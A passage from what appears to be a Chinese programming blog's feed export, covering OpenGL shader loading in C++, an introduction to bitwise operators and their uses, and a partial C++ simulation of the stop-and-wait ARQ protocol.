string <span class="token function">readShaderSource</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> filePath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	string content<span class="token punctuation">;</span>
	ifstream <span class="token function">fileStream</span><span class="token punctuation">(</span>filePath<span class="token punctuation">,</span> ios<span class="token double-colon punctuation">::</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
	string line <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>fileStream<span class="token punctuation">.</span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">getline</span><span class="token punctuation">(</span>fileStream<span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span>
		content<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>line <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	fileStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> content<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

GLuint <span class="token function">createShaderProgram</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	string vertShaderStr <span class="token operator">=</span> <span class="token function">readShaderSource</span><span class="token punctuation">(</span><span class="token string">"vertShader.glsl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	string fragShaderStr <span class="token operator">=</span> <span class="token function">readShaderSource</span><span class="token punctuation">(</span><span class="token string">"fragShader.glsl"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> vshaderSource <span class="token operator">=</span> vertShaderStr<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> fshaderSource <span class="token operator">=</span> fragShaderStr<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	GLint vertCompiled<span class="token punctuation">;</span>
	GLint fragCompiled<span class="token punctuation">;</span>
	GLint linked<span class="token punctuation">;</span>

	GLuint vShader <span class="token operator">=</span> <span class="token function">glCreateShader</span><span class="token punctuation">(</span>GL_VERTEX_SHADER<span class="token punctuation">)</span><span class="token punctuation">;</span>
	GLuint fShader <span class="token operator">=</span> <span class="token function">glCreateShader</span><span class="token punctuation">(</span>GL_FRAGMENT_SHADER<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">glShaderSource</span><span class="token punctuation">(</span>vShader<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>vshaderSource<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glShaderSource</span><span class="token punctuation">(</span>fShader<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>fshaderSource<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token comment">// 捕获编译着色器时的错误 </span>
	<span class="token function">glCompileShader</span><span class="token punctuation">(</span>vShader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">checkOpenGLError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glGetShaderiv</span><span class="token punctuation">(</span>vShader<span class="token punctuation">,</span> GL_COMPILE_STATUS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>vertCompiled<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>vertCompiled <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"vertex compilation failed"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token function">printShaderLog</span><span class="token punctuation">(</span>vShader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	
	<span class="token function">glCompileShader</span><span class="token punctuation">(</span>fShader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">checkOpenGLError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glGetShaderiv</span><span class="token punctuation">(</span>fShader<span class="token punctuation">,</span> GL_COMPILE_STATUS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>fragCompiled<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>fragCompiled <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"fragment compilation failed"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token function">printShaderLog</span><span class="token punctuation">(</span>fShader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// 捕获链接着色器时的错误</span>
	GLuint vfProgram <span class="token operator">=</span> <span class="token function">glCreateProgram</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glAttachShader</span><span class="token punctuation">(</span>vfProgram<span class="token punctuation">,</span> vShader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glAttachShader</span><span class="token punctuation">(</span>vfProgram<span class="token punctuation">,</span> fShader<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glLinkProgram</span><span class="token punctuation">(</span>vfProgram<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">checkOpenGLError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">glGetProgramiv</span><span class="token punctuation">(</span>vfProgram<span class="token punctuation">,</span> GL_LINK_STATUS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>linked<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>linked <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"linked failed"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token function">printProgramLog</span><span class="token punctuation">(</span>vfProgram<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> vfProgram<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">printShaderLog</span><span class="token punctuation">(</span>GLuint shader<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> chWritten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> log<span class="token punctuation">;</span>
	<span class="token function">glGetShaderiv</span><span class="token punctuation">(</span>shader<span class="token punctuation">,</span> GL_INFO_LOG_LENGTH<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		log <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">glGetShaderInfoLog</span><span class="token punctuation">(</span>shader<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token operator">&amp;</span>chWritten<span class="token punctuation">,</span> log<span class="token punctuation">)</span><span class="token punctuation">;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Shader Info Log: "</span> <span class="token operator">&lt;&lt;</span> log <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">printProgramLog</span><span class="token punctuation">(</span><span class="token keyword">int</span> prog<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> chWritten <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span><span class="token operator">*</span> log<span class="token punctuation">;</span>
	<span class="token function">glGetProgramiv</span><span class="token punctuation">(</span>prog<span class="token punctuation">,</span> GL_INFO_LOG_LENGTH<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		log <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">glGetProgramInfoLog</span><span class="token punctuation">(</span>prog<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token operator">&amp;</span>chWritten<span class="token punctuation">,</span> log<span class="token punctuation">)</span><span class="token punctuation">;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Program Info Log: "</span> <span class="token operator">&lt;&lt;</span> log <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		<span class="token function">free</span><span class="token punctuation">(</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">bool</span> <span class="token function">checkOpenGLError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">bool</span> foundError <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> glErr <span class="token operator">=</span> <span class="token function">glGetError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>glErr <span class="token operator">!=</span> GL_NO_ERROR<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		cout <span class="token operator">&lt;&lt;</span> <span class="token string">"glError: "</span> <span class="token operator">&lt;&lt;</span> glErr <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
		foundError <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
		glErr <span class="token operator">=</span> <span class="token function">glGetError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> foundError<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="fragShader-glsl"><a href="#fragShader-glsl" class="headerlink" title="fragShader.glsl"></a>fragShader.glsl</h2><pre class="language-glsl" data-language="glsl"><code class="language-glsl"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">version</span> <span class="token expression"><span class="token number">430</span></span></span>

<span class="token keyword">out</span> <span class="token keyword">vec4</span> color<span class="token punctuation">;</span>

<span class="token keyword">uniform</span> <span class="token keyword">mat4</span> mv_matrix<span class="token punctuation">;</span>
<span class="token keyword">uniform</span> <span class="token keyword">mat4</span> proj_matrix<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	color <span class="token operator">=</span> <span class="token keyword">vec4</span><span class="token punctuation">(</span><span class="token number">0.47</span><span class="token punctuation">,</span> <span class="token number">0.93</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="vertShader-glsl"><a href="#vertShader-glsl" class="headerlink" title="vertShader.glsl"></a>vertShader.glsl</h2><pre class="language-glsl" data-language="glsl"><code class="language-glsl"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">version</span> <span class="token expression"><span class="token number">430</span></span></span>

<span class="token keyword">layout</span> <span class="token punctuation">(</span>location <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token keyword">vec3</span> position<span class="token punctuation">;</span>

<span class="token keyword">uniform</span> <span class="token keyword">mat4</span> mv_matrix<span class="token punctuation">;</span>
<span class="token keyword">uniform</span> <span class="token keyword">mat4</span> proj_matrix<span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	gl_Position <span class="token operator">=</span> proj_matrix <span class="token operator">*</span> mv_matrix <span class="token operator">*</span> <span class="token keyword">vec4</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>计算机图形学</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>OpenGL</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>位运算基础及应用</title>
    <url>/2021/09/26/%E4%BD%8D%E8%BF%90%E7%AE%97%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<p>计算机中的数据以二进制的形式存储，即0、1两种状态。<strong>位运算</strong>就是直接对整数在内存中的二进制位进行操作。本文将介绍位运算的各操作符以及常见应用。</p>
<span id="more"></span>

<h1 id="操作符"><a href="#操作符" class="headerlink" title="操作符"></a>操作符</h1><h2 id="amp-（与）"><a href="#amp-（与）" class="headerlink" title="&amp;（与）"></a>&amp;（与）</h2><p>参加运算的两个数据，按二进制位进行与运算。（两位都为1时才为1，否则为0）</p>
<p>例如 12 和 5 两个数，二进制形式分别为 1100、0101. 逐个按位进行与运算得：0100 = 4. 即 12 &amp; 5 = 4.</p>
<h2 id="（或）"><a href="#（或）" class="headerlink" title="|（或）"></a>|（或）</h2><p>参加运算的两个数据，按二进制位进行或运算。（两位都为0时才为0，否则为1）</p>
<p>例如 12 和 5 两个数，二进制形式分别为 1100、0101. 逐个按位进行或运算得：1101 = 13. 即 12 | 5 = 13.</p>
<h2 id="（异或）"><a href="#（异或）" class="headerlink" title="^（异或）"></a>^（异或）</h2><p>参加运算的两个数据，按二进制位进行异或运算。（相同为0，不同为1）</p>
<p>例如 12 和 5 两个数，二进制形式分别为 1100、0101. 逐个按位进行异或运算得：1001 = 9. 即 12 ^ 5 = 9.</p>
<h2 id="（取反）"><a href="#（取反）" class="headerlink" title="~（取反）"></a>~（取反）</h2><p>参加运算的数据，其各二进制位进行取反运算。（0变成1，1变成0）</p>
<p>例如 5，对于一个 int16 型数据，它的二进制形式为 0 000 0000 0000 0101. 取反后得：1 111 1111 1111 1010（符号位为 1，为负数）将此补码转换为原码得：1 000 0000 0000 0110，十进制为 -6. 即 ~5 = -6.</p>
<h2 id="lt-lt-（左移）"><a href="#lt-lt-（左移）" class="headerlink" title="&lt;&lt;（左移）"></a>&lt;&lt;（左移）</h2><p>参加运算的数据，其各二进制位向左进行移位操作，高位丢弃，低位补0.</p>
<p>例如 5，对于一个 int16 型数据，它的二进制形式为 0 000 0000 0000 0101. 左移 3 位后得：0 000 0000 0010 1000 = 40.</p>
<p>即 5 &lt;&lt; 3 = 40.</p>
<h2 id="gt-gt-（右移）"><a href="#gt-gt-（右移）" class="headerlink" title="&gt;&gt;（右移）"></a>&gt;&gt;（右移）</h2><p>参加运算的数据，其各二进制位向右进行移位操作，低位丢弃，对于无符号数，高位补 0，对于有符号数，高位补原来的符号位。</p>
<ul>
<li>例如 5，对于一个 int16 型数据，它的二进制形式为 0 000 0000 0000 0101. 左移 2 位后得：0 000 0000 0000 0001 = 1. 即 5 &gt;&gt; 2 = 1.</li>
<li>例如 -5，对于一个 int16 型数据，它的二进制形式为 1 111 1111 1111 1011. 右移 2 位后得：1 111 1111 1111 1110 = -2. 即 -5 &gt;&gt; 2 = -2.</li>
</ul>
<h1 id="常见应用"><a href="#常见应用" class="headerlink" title="常见应用"></a>常见应用</h1><h2 id="左移、右移实现乘除法"><a href="#左移、右移实现乘除法" class="headerlink" title="左移、右移实现乘除法"></a>左移、右移实现乘除法</h2><p>由左移、右移的定义可知，一个二进制数 0000 1010 左移两位后为 0010 1000 = 2<sup>5</sup> * 2<sup>3</sup> = 2<sup>2</sup> * (2<sup>3</sup> * 2<sup>1</sup>). 由此可见，在数据未溢出的情况下，左移 n 位，相当于原数的值乘以 2<sup>n</sup>. </p>
<p>同理，右移相当于除以 2<sup>n</sup>.</p>
<h2 id="异或判断两数符号的异同"><a href="#异或判断两数符号的异同" class="headerlink" title="异或判断两数符号的异同"></a>异或判断两数符号的异同</h2><p>判断两个有符号数是同号还是异号，我们可以用条件控制语句进行判断；也可以将两数相乘判断积的正负；同样也可以使用异或运算符。</p>
<p>由于有符号数最高位为符号位，因此在进行异或运算时，两数的符号位也将参与运算。若两数的符号位相同，则异或结果 res 的符号位为 0，即 res &gt;= 0; 若两数的符号位不同，则异或结果 res 的符号位为 1，即 res &lt; 0.</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isSameSign</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> res <span class="token operator">=</span> a <span class="token operator">^</span> b<span class="token punctuation">;</span>
    <span class="token keyword">return</span> res <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h2 id="与运算判断数的奇偶性"><a href="#与运算判断数的奇偶性" class="headerlink" title="与运算判断数的奇偶性"></a>与运算判断数的奇偶性</h2><p>和异或判断两数符号异同类似原理类似，根据二进制数的最低位是 1 还是 0 来判断该数是奇数还是偶数。</p>
<p>要判断一个数 a 的奇偶性，可以先计算 res = a &amp; 1 的值。若 res = 0，则为偶数；若 res = 1，则为奇数。</p>
<pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">bool</span> <span class="token function">isOdd</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> res <span class="token operator">=</span> a <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> res <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>计算机基础</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title>停止等待协议的模拟实现</title>
    <url>/2022/05/05/%E5%81%9C%E6%AD%A2%E7%AD%89%E5%BE%85%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="协议原理"><a href="#协议原理" class="headerlink" title="协议原理"></a>协议原理</h1><p><img src="/2022/05/05/%E5%81%9C%E6%AD%A2%E7%AD%89%E5%BE%85%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0/%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86.png"></p>
<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><h2 id="基本传输"><a href="#基本传输" class="headerlink" title="基本传输"></a>基本传输</h2><p>本次实验我采用了程序模拟的方式实现。发送方和接收方都为一个数组，传输过程即为发送方数组向接收方数组传递数据，并使用随机数生成的方式模拟传输过程中可能出现的差错，并且传输时间也为一个在 50 - 150 ms 间的随机数，用一个迭代器来模拟此时发送方的数据位置。</p>
<p>传输过程为一个循环语句，终止条件为发送迭代器到达发送方数组的末尾位置。</p>
<h2 id="选择重传"><a href="#选择重传" class="headerlink" title="选择重传"></a>选择重传</h2><p>每次进行传输，传输时间就会累加，在一轮传输的最后判断累计时间是否超过了规定 t<sub>out</sub>，如果未超过，代表数据成功接收，发送迭代器自增 1。 否则，不进行操作，下一次循环将会再次尝试发送该数据。</p>
<h2 id="舍弃重复帧"><a href="#舍弃重复帧" class="headerlink" title="舍弃重复帧"></a>舍弃重复帧</h2><p>存在这么一种情况，接收方成功接收了发送方的数据，并返回了一个 ACK 帧，但是此 ACK 帧还未到达发送方就已被其判定为超时，那么发送方将会重新发送上一次的数据帧，若该数据帧成功到达接收方，那么接收方需要将该数据帧舍弃（因此上一次传输时接收方已成功接受了该数据帧）。实现方法是判断接受数组的最后一个元素（即上一次接收的元素）是否与此时接受的相同，若相同，则不接收，并重新发送 ACK 帧。</p>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;string></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;Windows.h></span></span>
<span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">myData</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">int</span> bin<span class="token punctuation">;</span>
	string str<span class="token punctuation">;</span>
	<span class="token function">myData</span><span class="token punctuation">(</span><span class="token keyword">int</span> b<span class="token punctuation">,</span> string s<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">bin</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name">ARQ</span> <span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
	<span class="token keyword">void</span> <span class="token function">transmitData</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>myData<span class="token operator">></span><span class="token operator">&amp;</span> reciver<span class="token punctuation">,</span> vector<span class="token operator">&lt;</span>myData<span class="token operator">></span><span class="token operator">&amp;</span> sender<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">auto</span> itSender <span class="token operator">=</span> sender<span class="token punctuation">.</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span> <span class="token punctuation">(</span>itSender <span class="token operator">!=</span> sender<span class="token punctuation">.</span><span class="token function">cend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">int</span> sendBin <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 传输过程数据可能出错</span>
			<span class="token keyword">double</span> transTime <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">101</span> <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">;</span> <span class="token comment">// 随机传输时间为 50 - 150 ms</span>
			myData <span class="token function">sendData</span><span class="token punctuation">(</span>sendBin<span class="token punctuation">,</span> itSender<span class="token operator">-></span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 取数据帧</span>
			cout <span class="token operator">&lt;&lt;</span> <span class="token string">"sender: 正在发送第 "</span> <span class="token operator">&lt;&lt;</span> itSender <span class="token operator">-</span> sender<span class="token punctuation">.</span><span class="token function">cbegin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" 帧..."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
			<span class="token function">Sleep</span><span class="token punctuation">(</span>transTime<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 数据传输过程</span>
			<span class="token keyword">bool</span> isRight <span class="token operator">=</span> sendData<span class="token punctuation">.</span>bin<span class="token punctuation">;</span> <span class="token comment">// 检错</span>
			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>reciver<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> reciver<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>str <span class="token operator">==</span> sendData<span class="token punctuation">.</span>str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 舍弃重复帧</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reciver: 丢弃重复帧，准备重新发送 ACK 帧。"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				isRight <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
				transTime <span class="token operator">+=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">101</span> <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">;</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reciver: 正在发送 ACK 帧..."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				<span class="token function">Sleep</span><span class="token punctuation">(</span>transTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>isRight<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 数据正确</span>
				reciver<span class="token punctuation">.</span><span class="token function">emplace_back</span><span class="token punctuation">(</span>sendData<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 接收数据</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reciver: 数据成功接收，准备发送 ACK 帧。"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				transTime <span class="token operator">+=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">101</span> <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">;</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reciver: 正在发送 ACK 帧..."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				<span class="token function">Sleep</span><span class="token punctuation">(</span>transTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 数据错误</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reciver: 数据错误，发送 NAK 帧。"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				transTime <span class="token operator">+=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">101</span> <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">;</span>
				cout <span class="token operator">&lt;&lt;</span> <span class="token string">"reciver: 正在发送 NAK 帧..."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
				<span class="token function">Sleep</span><span class="token punctuation">(</span>transTime<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>

			<span class="token keyword">if</span> <span class="token punctuation">(</span>transTime <span class="token operator">&lt;</span> <span class="token number">250</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 未超时</span>
